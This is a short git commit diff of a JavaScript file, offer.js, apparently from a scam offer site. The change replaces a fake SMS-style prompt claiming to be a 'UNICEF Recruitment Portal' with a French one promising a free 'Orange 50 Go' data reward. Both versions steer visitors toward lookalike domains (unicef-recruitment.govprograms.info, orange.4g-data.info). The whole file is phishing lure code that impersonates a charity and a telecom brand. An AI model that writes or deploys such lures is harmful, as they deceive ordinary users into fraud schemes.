82996e16e623448e040a65dc78ac605ed844c6e9
realmankeny <realmankeny@gmail.com>
2025-04-10 03:22:15 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'OK'
-password=prompt('SMS: Welcome to the UNICEF Recruitment Portal, Kindly Press OK to PROCEED ','OK');
-if (password != 'OK') {
-location.href='https://unicef-recruitment.govprograms.info/job';
+var password = 'Obtenez 50 Go'
+password=prompt('SMS: Bienvenue sur Orange 50 Go Old Sim Récompense, Veuillez appuyer sur OK pour CONTINUER','Obtenez 50 Go');
+if (password != 'Obtenez 50 Go') {
+location.href='https://orange.4g-data.info/50GB';
 }
